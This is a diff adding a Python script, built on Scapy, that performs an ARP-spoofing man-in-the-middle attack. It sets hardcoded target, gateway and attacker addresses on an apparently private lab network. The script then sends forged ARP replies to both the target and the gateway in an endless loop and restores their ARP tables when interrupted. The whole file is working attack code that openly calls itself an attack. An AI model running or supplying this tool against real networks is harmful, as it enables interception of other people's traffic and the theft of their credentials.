@@ -1,0 +1,60 @@
+from scapy.all import ARP, send
+from time import sleep
+
+# Configuration
+target_ip = "192.168.200.131"  # Target device IP
+gateway_ip = "192.168.200.2"  # Gateway IP (router)
+attacker_mac = "00:0c:29:27:93:08"  # Attacker's MAC address (your MAC)
+gateway_mac = "00:50:56:e2:be:50"  # Gateway MAC address
+target_mac = "00:0c:29:14:c9:5c"  # Target device MAC address
+
+# Function to restore the original ARP table
+def restore_arp(dest_ip, dest_mac, src_ip, src_mac):
+    packet = ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
+    send(packet, count=4, verbose=False)
+    print(f"[+] ARP Table restored for {dest_ip}.")
+
+# Print ARP Spoofing configuration
+print("\n[+] ARP Spoofing Configuration:")
+print(f" [+] IPv4 Forwarding .................... {'False'}")
+print(f" [+] Interface       ..................... {'eth1'}")
+print(f" [+] Attacker MAC    ..................... {attacker_mac}")
+print(f" [+] Gateway IP      ..................... {gateway_ip}")
+print(f" [+] Gateway MAC     ..................... {gateway_mac}")
+print(f" [+] Target IP       ..................... {target_ip}")
+print(f" [+] Target MAC      ..................... {target_mac}\n")
+
+# Start ARP Spoofing
+try:
+    print("[+] ARP Spoofing attack initiated. Press Ctrl-C to abort.")
+    while True:
+        # Poison the target: Associate the attacker's MAC with the gateway's IP
+        target_arp_response = ARP(
+            op=2, 
+            pdst=target_ip, 
+            hwdst=target_mac, 
+            psrc=gateway_ip, 
+            hwsrc=attacker_mac
+        )
+        send(target_arp_response, verbose=False)
+        print(f"[INFO] Sent ARP response: {gateway_ip} is-at {attacker_mac} to {target_ip} ({target_mac})")
+
+        # Poison the gateway: Associate the attacker's MAC with the target's IP
+        gateway_arp_response = ARP(
+            op=2, 
+            pdst=gateway_ip, 
+            hwdst=gateway_mac, 
+            psrc=target_ip, 
+            hwsrc=attacker_mac
+        )
+        send(gateway_arp_response, verbose=False)
+        print(f"[INFO] Sent ARP response: {target_ip} is-at {attacker_mac} to {gateway_ip} ({gateway_mac})")
+
+        # Wait before sending the next spoofing packets
+        sleep(1)
+
+except KeyboardInterrupt:
+    print("\n[!] Attack stopped. Restoring network...")
+    # Restore the original ARP tables
+    restore_arp(target_ip, target_mac, gateway_ip, gateway_mac)
+    restore_arp(gateway_ip, gateway_mac, target_ip, target_mac)
